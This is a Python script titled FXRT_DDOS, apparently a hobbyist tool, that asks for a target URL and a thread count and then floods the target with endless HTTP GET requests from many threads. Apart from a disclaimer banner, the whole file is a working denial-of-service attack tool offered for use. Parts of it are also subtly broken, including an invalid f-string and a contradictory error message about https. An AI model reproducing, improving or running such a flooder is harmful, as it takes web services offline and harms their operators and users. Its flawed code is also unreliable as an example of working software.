#creator: Fxrt2711
#version: 0.0.1
#date: 25/1/24
#update: 25/1/24
#
try:
    import os
except:
    exit("missing MAIN lib: os")
try:
    import sys
except:
    exit("missing MAIN lib: sys")
try:
    from colorama import Fore
except:
    exit("missing lib: colorama")
try:
    import threading
except:
    exit("missing lib: threading")
try:
    import requests
except:
    exit("missing lib: requests")
try:
    from time import sleep
except:
    exit("missing lib: time")
#
op_sy = sys.platform
x = 0 
#
def clear():
    if op_sy == ("linux"):
        os.system("clear")
    else:
        os.system("cls")
#
def dos_trget(target):
#
    while True:
        try:
            rves = requests.get(target)
            print(f"Request sented to {x = x + 1}")
#
        except requests.exceptions.ConnectionError:
            print("Check internet connection")
#
#
#
while True:
    clear()
    print(Fore.RED + """

                ╔═══╗╔═╗╔═╗╔═══╗╔════╗    ╔═══╗╔═══╗╔═══╗╔═══╗
                ║╔══╝╚╗╚╝╔╝║╔═╗║║╔╗╔╗║    ╚╗╔╗║╚╗╔╗║║╔═╗║║╔═╗║
                ║╚══╗ ╚╗╔╝ ║╚═╝║╚╝║║╚╝     ║║║║ ║║║║║║ ║║║╚══╗
                ║╔══╝ ╔╝╚╗ ║╔╗╔╝  ║║       ║║║║ ║║║║║║ ║║╚══╗║
               ╔╝╚╗  ╔╝╔╗╚╗║║║╚╗ ╔╝╚╗     ╔╝╚╝║╔╝╚╝║║╚═╝║║╚═╝║
               ╚══╝  ╚═╝╚═╝╚╝╚═╝ ╚══╝     ╚═══╝╚═══╝╚═══╝╚═══╝
        (◣_◢)I am not responsible for damage caused by FXRT_DDOS (◣_◢)
    (◣_◢)Attacking targets without prior mutual consent is ILLIGAL!!!(◣_◢)
    """)
#
    run_url = True
    while run_url:
        http_url = input(Fore.GREEN + "Enter URL>> ")
        if not http_url.startswith("http"):
            print("wrong url. you can,t ddos https")
            pass
        elif not http_url.__contains__("."):
            print("invalid domain")
            pass
        else:
            run_url = False
#
    run_threads = True
    while run_threads:
        threads = int(input(Fore.GREEN + "Threads: " + Fore.RED + ""))
        if threads <= 0:
            print("invalid number")
            pass
        else:
            run_threads = False
# 
#
    print("press enter to start the attack")
    nothing = input("")
#
    for i in range(0, threads):
        thr = threading.Thread(target=dos_trget, args=(http_url,))
        thr_1 = threading.Thread(target=dos_trget, args=(http_url,))
        thr_2 = threading.Thread(target=dos_trget, args=(http_url,))
        thr_3 = threading.Thread(target=dos_trget, args=(http_url,))
        thr_4 = threading.Thread(target=dos_trget, args=(http_url,))
        thr_5 = threading.Thread(target=dos_trget, args=(http_url,))
        thr_6 = threading.Thread(target=dos_trget, args=(http_url,))
        thr_7 = threading.Thread(target=dos_trget, args=(http_url,))
        thr_8 = threading.Thread(target=dos_trget, args=(http_url,))
#
        thr.start()
        thr_1.start()
        thr_2.start()
        thr_3.start()
        thr_4.start()
        thr_5.start()
        thr_6.start()
        thr_7.start()
        thr_8.start()
        
